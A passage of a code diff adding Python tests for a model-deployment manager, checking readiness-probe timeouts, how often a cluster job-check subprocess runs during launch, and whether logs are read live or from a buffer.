+        autostart=False,
+        port_free_fn=lambda port: True,
+        ready_poll_interval_s=0.01,
+        ready_timeout_s=1.0,
+    )
+    try:
+        started = time.monotonic()
+        deployment = manager.launch(
+            fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256
+        )
+        assert wait_for(
+            lambda: manager.get(deployment.deployment_id).state is S.FAILED,
+            timeout=5.0,
+        )
+        elapsed = time.monotonic() - started
+        # One budget of 1.0s, not 0.6 spent launching and 1.0 more waiting.
+        # The bug's value is 1.6 and the fix's is 1.0; 1.35 is between them
+        # with room on both sides rather than sitting on either.
+        assert elapsed < 1.35, "LAUNCHING ran %.2fs against a 1.0s timeout" % elapsed
+        # And the sentence names that budget rather than a fraction of it.
+        assert "did not answer within 1s" in manager.get(
+            deployment.deployment_id
+        ).last_error
+    finally:
+        manager.close()
+
+
+def test_the_readiness_probe_is_given_a_timeout_it_can_be_held_to(tmp_path):
+    """The one probe in the manager that used to have no timeout of its own.
+
+    It took health.probe's 3.0s default across as many as three URLs --
+    `/v1/models` first, then both HEALTH_PATHS -- so a bound-but-hanging port
+    could spend 9s inside a loop whose caller asked to poll every 3. Every
+    other probe site in the file either derives a timeout or passes one.
+    """
+    from control_plane.deploy.health import HEALTH_PATHS
+    from control_plane.deploy.manager import MIN_PROBE_TIMEOUT_S
+
+    manager = make_manager(tmp_path, ready_poll_interval_s=3.0)
+    try:
+        # The poll interval, shared out across the models read and the health
+        # paths -- an iteration costs about what the caller asked to wait.
+        assert manager._ready_probe_timeout() == pytest.approx(
+            3.0 / (len(HEALTH_PATHS) + 1)
+        )
+        # Never zero, however short the caller made the poll.
+        (tmp_path / "b").mkdir()
+        impatient = make_manager(tmp_path / "b", ready_poll_interval_s=0.001)
+        try:
+            assert impatient._ready_probe_timeout() >= MIN_PROBE_TIMEOUT_S
+        finally:
+            impatient.close()
+    finally:
+        manager.close()
+
+
+def test_the_launch_does_not_shell_out_to_check_job_on_every_poll(tmp_path):
+    """`sparkrun cluster check-job` is a subprocess, and off-host an SSH round
+    trip to the node that is busy loading the model. At a 3s poll it was some
+    six hundred of them across a long launch, serialized with the probe and
+    the sleep, to catch a case the runtime's own words already cover on every
+    pass. The first poll still checks, so a launch into a container that is
+    already gone fails at once.
+    """
+    registry = FakeRegistry(fx.SPARK_01, fx.SPARK_02)
+    adapter = FakeAdapter(registry, recipe_dir=tmp_path / "recipes")
+    checks: list[str] = []
+    inner = adapter.is_running
+
+    def counted(cluster_id, **kwargs):
+        checks.append(cluster_id)
+        return inner(cluster_id, **kwargs)
+
+    adapter.is_running = counted
+    probe = FakeProbe(healthy_by_default=False)
+    manager = DeploymentManager(
+        adapter,
+        registry,
+        state_dir=tmp_path,
+        probe_fn=probe,
+        autostart=False,
+        port_free_fn=lambda port: True,
+        ready_poll_interval_s=0.001,
+        ready_timeout_s=5.0,
+    )
+    try:
+        deployment = manager.launch(
+            fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256
+        )
+        # Let the readiness loop run a while, then let it succeed.
+        assert wait_for(lambda: probe.calls > 40, timeout=5.0)
+        polls, shelled = probe.calls, len(checks)
+        probe.healthy_by_default = True
+        assert wait_for(
+            lambda: manager.get(deployment.deployment_id).state is S.READY
+        )
+        # Checked on the first pass, and well short of once per poll after it.
+        assert shelled >= 1
+        assert shelled < polls / 2, "%d check-jobs across %d polls" % (shelled, polls)
+    finally:
+        manager.close()
+
+
+def test_a_serving_deployment_reads_its_log_live_rather_than_replaying_it(tmp_path):
+    """The buffer stops at READY, so after that it is a recording.
+
+    Answering "what is my backend logging" with a snapshot of how it started
+    twenty minutes ago is worse than spending a bounded read on the truth --
+    and it is exactly what happens if the buffer is preferred whenever it has
+    anything in it. A deployment that FAILED is the exception: its buffer holds
+    the death, and its container is usually gone, so a live read would come
+    back empty and lose the only copy.
+    """
+    probe = FakeProbe(healthy_by_default=False)
+    manager = make_manager(tmp_path, probe=probe)
+    manager.adapter.log_tail = "INFO Starting to load model X..."
+    dep = manager.launch(
+        fx.QWEN3_30B_A3B, fx.single_node_plan(), fx.fits(), "vllm", 8192, 64
+    )
+
+    # While it is launching, the buffer is what is being streamed: free, live,
+    # and safe for a screen to poll.
+    assert wait_for(lambda: manager.log_tail(dep.deployment_id)["source"] == "buffer")
+
+    probe.healthy_by_default = True
+    assert wait_for(lambda: manager.get(dep.deployment_id).state is S.READY)
+    # Now nothing is following it, so the answer comes from the node.
+    manager.adapter.log_tail = "INFO this line only exists now"
+    answer = manager.log_tail(dep.deployment_id)
+    assert answer["source"] == "read"
+    assert any("only exists now" in line for line in answer["lines"])
+    manager.close()
